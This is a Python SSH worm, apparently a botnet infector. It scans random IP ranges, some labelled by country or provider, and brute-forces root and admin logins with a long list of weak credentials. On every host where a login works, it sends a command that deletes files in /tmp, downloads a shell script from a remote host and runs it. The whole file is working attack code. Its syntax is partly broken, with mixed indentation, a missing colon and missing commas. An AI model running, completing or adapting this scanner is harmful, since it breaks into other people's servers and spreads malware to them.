#!/usr/bin/env python

import threading, paramiko, random, socket, time, sys

cmd='cd /tmp; rm -rf *; wget -q http://host/gtop.sh; chmod +x gtop.sh; sh gtop.sh; rm -rf *\r\n'
blacklist = [
    '127'
]
passwords = [ 
    "root:root",
    "root:lol",
    "root:admin",
    "ubnt:ubnt"
    "root:1234",
    "admin:1234",
    "root:toor",
    "root:sex",
    "root:test",
    "pi:pi",
    "root:cent6"
    "root:admin",
    "root:root",
    "admin:password",
    "ubnt:ubnt"
    "root:1234",
    "root:123",
	"root:12345",
    "root:Password",
    "root:lol",
    "root:toor",
    "root:centos7",
    "root:qwerty",
    "root:centos6",
    "root:pussy",
    "root:user",
    "root:money",
    "root:love",
    "root:1",
	"root:2",
	"root:3",
	"root:0",
	"root:987",
	"root:5",
	"root:beer",
	"root:cia",
	"root:fbi",
	"root:hack",
	"root:bank",
	"root:gov",
	"root:youtube",
	"root:website",
	"root:server",
	"root:weed",
	"root:420",
	"root:computer",
	"root:linux",
	"root:debain",
	"root:cent",
	"root:vps",
	"root:VPS",
	"root:light",
	"root:cap",
	"root:hat",
	"root:butt",
	"root:but",
	"root:name",
	"root:god",
	"root:work",
	"root:job",
	"root:bailey",
	"root:123456",
	"root:michael",
	"root:superman",
	"root:batman",
	"root:starwars",
	"root:startrek",
	"root:desktop",
	"root:windows",
	"root:netflix",
	"root:shoe",
	"root:foot",
	"root:tor",
	"root:rot",
	"root:roots",
	"root:root1",
	"root:root2",
	"root:root3",
	"root:root4",
	"root:root5",
	"root:root6",
	"root:root12",
	"root:root123",
	"root:root1234",
	"root:root12345",
	"root:root123456",
	"root:iphone",
	"root:apple",
	"root:verizon",
	"root:talktalk",
	"root:at&t",
	"root:strighttalk",
	"root:|",
	"root:="
	"root:abc",
	"root:xyz",
	"root:abc1",
	"root:abc12",
	"root:abc123",
	"root:abc1234",
	"root:abc12345",
	"root:abc123456",
	"root:sync"
	"root:-"
	"root:",
	"root: ",
	"root:a",
	"root:z",
	"root:python",
	"root:perl",
	"root:dos",
	"root:sql",
	"root:database",
	"root:minecraft",
	"root:minecraft1",
	"root:minecraft2",
	"root:minecraft3",
	"root:minecraft4",
	"root:minecraft5",
	"root:minecraft6",
	"root:minecraft7",
	"root:minecraft8",
	"root:minecraft9",
	"root:minecraft0",
	"root:minecraft12",
	"root:minecraft123",
	"root:minecraft1234",
	"root:minecraft12345",
	"root:minecraft123456",
	"root:minecraft1234567"
	"root:minecraft12345678",
	"root:minecraft123456789",
	"root:minecraft1234567890",
	"root:login",
	"root:login123",
	"root:solo",
	"root:passw0rd",
	"root:password123",
	"root:admins",
	"root:cigs",
	"root:ruby",
	"root:html",
	"root:php",
	"root:youtuber",
	"root:pewdiepiefan",
	"root:pewdiepie",
	"root:cod",
	"root:android",
	"root:phone",
	"root:pass",
	"root:school",
	"root:q",
	"root:webserver",
	"root:college",
	"root:keys",
	"root:dog",
	"root:cat",
	"admin:admin",
	"admin:admin1",
	"admin:admin2",
	"admin:admin3",
	"admin:admin4",
	"admin:admin5",
	"admin:admin6",
	"admin:admin7",
	"admin:admin8",
	"admin:admin9",
	"admin:admin0",
	"admin:admin12",
	"admin:admin123",
	"admin:admin1234",
	"admin:admin12345",
	"admin:admin123456"
	"admin:admin1234567",
	"admin:admin12345678",
	"admin:admin123456789",
	"admin:admin1234567890",
	"admin:admin098",
	"admin:admin987",
	"admin:admin321",
]
if sys.argv[4] == '1':
    passwords = ["root:root",
    "root:admin",
    "root:root",
    "admin:password",
    "ubnt:ubnt"
    "root:1234",
    "root:123",
	"root:12345",
    "root:Password",
    "root:lol",
    "root:toor",
    "root:centos7",
    "root:qwerty",
    "root:centos6",
    "root:pussy",
    "root:user",
    "root:money",
    "root:love",
    "root:1",
	"root:2",
	"root:3",
	"root:0",
	"root:987",
	"root:5",
	"root:beer",
	"root:cia",
	"root:fbi",
	"root:hack",
	"root:bank",
	"root:gov",
	"root:youtube",
	"root:website",
	"root:server",
	"root:weed",
	"root:420",
	"root:computer",
	"root:linux",
	"root:debain",
	"root:cent",
	"root:vps",
	"root:VPS",
	"root:light",
	"root:cap",
	"root:hat",
	"root:butt",
	"root:but",
	"root:name",
	"root:god",
	"root:work",
	"root:job",
	"root:bailey",
	"root:123456",
	"root:michael",
	"root:superman",
	"root:batman",
	"root:starwars",
	"root:startrek",
	"root:desktop",
	"root:windows",
	"root:netflix",
	"root:shoe",
	"root:foot",
	"root:tor",
	"root:rot",
	"root:roots",
	"root:root1",
	"root:root2",
	"root:root3",
	"root:root4",
	"root:root5",
	"root:root6",
	"root:root12",
	"root:root123",
	"root:root1234",
	"root:root12345",
	"root:root123456",
	"root:iphone",
	"root:apple",
	"root:verizon",
	"root:talktalk",
	"root:at&t",
	"root:strighttalk",
	"root:|",
	"root:="
	"root:abc",
	"root:xyz",
	"root:abc1",
	"root:abc12",
	"root:abc123",
	"root:abc1234",
	"root:abc12345",
	"root:abc123456",
	"root:sync"
	"root:-"
	"root:",
	"root: ",
	"root:a",
	"root:z",
	"root:python",
	"root:perl",
	"root:dos",
	"root:sql",
	"root:database",
	"root:minecraft",
	"root:minecraft1",
	"root:minecraft2",
	"root:minecraft3",
	"root:minecraft4",
	"root:minecraft5",
	"root:minecraft6",
	"root:minecraft7",
	"root:minecraft8",
	"root:minecraft9",
	"root:minecraft0",
	"root:minecraft12",
	"root:minecraft123",
	"root:minecraft1234",
	"root:minecraft12345",
	"root:minecraft123456",
	"root:minecraft1234567"
	"root:minecraft12345678",
	"root:minecraft123456789",
	"root:minecraft1234567890",
	"root:login",
	"root:login123",
	"root:solo",
	"root:passw0rd",
	"root:password123",
	"root:admins",
	"root:cigs",
	"root:ruby",
	"root:html",
	"root:php",
	"root:youtuber",
	"root:pewdiepiefan",
	"root:pewdiepie",
	"root:cod",
	"root:android",
	"root:phone",
	"root:pass",
	"root:school",
	"root:q",
	"root:webserver",
	"root:college"
	"root:keys",
	"root:dog",
	"root:cat",
	"admin:admin",
	"admin:admin1",
	"admin:admin2",
	"admin:admin3",
	"admin:admin4",
	"admin:admin5",
	"admin:admin6",
	"admin:admin7",
	"admin:admin8",
	"admin:admin9",
	"admin:admin0",
	"admin:admin12",
	"admin:admin123",
	"admin:admin1234",
	"admin:admin12345",
	"admin:admin123456"
	"admin:admin1234567",
	"admin:admin12345678",
	"admin:admin123456789",
	"admin:admin1234567890",
	"admin:admin098",
	"admin:admin987",
	"admin:admin321",
    "root:123",]
	ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "USA":
                        usa = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
                        self.host = random.choice(usa)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "Russia":
                        russia = ["122","131","161","37","186","187","31","188","201","2","200"]
                        self.host = random.choice(russia)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LSD":
                        lsd = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
                        self.host = random.choice(lsd)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "Shrooms":
                        shrooms = ["122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118" ]
                        self.host = random.choice(shrooms)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "Xanax":
						xanax = ["23.96","23.97","23.98","23.99","23.100","23.101","23.102","23.103","70.37","104.40","104.41","104.42","104.43","104.44","104.45","104.46","104.47","104.146","104.147","104.208","104.209","104.210","104.210","104.211","104.212","104.213","104.214","104.215","138.91","168.61","168.62","168.63","113.53","125.125","125.126","125.127"]
						self.host = random.choice(xanax)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "Cisco":
                        cisco = ["1"]
                        self.host = random.choice(cisco)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "Busybox":
						busybox = ["199.180","142.0","158.69"]
						self.host = random.choice(busybox)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "WholeSale":
						wholesale = ["208.67"]
						self.host = random.choice(wholesale)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "ECATEL":
						ecatel = ["89.248"]
						self.host = random.choice(ecatel)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "CHINA":
						china = ["65.19","220.248"]
						self.host = random.choice(china)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "INDIA":
						india = ["1.6","1.7","1.22","1.23"]
						self.host = random.choice(india)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "CDN":
						cdn = ["217.106","217.106"]
						self.host = random.choice(cdn)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
					elif ipclassinfo == "AWS"
						aws = ["23.20","27.0","27.22","43.250","46.0","47.0","50.15","51.0","52.0","52.100"]
						self.host = random.choice(aws)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))                    
						elif ipclassinfo == "Random":
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[31mINFECTING:'+self.host+'|'+username+'|'+password+'|'+str(port)
                        ssh.exec_command(""+cmd+"")
                        time.sleep(20)
                        ssh.close()
            except:
                pass

for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass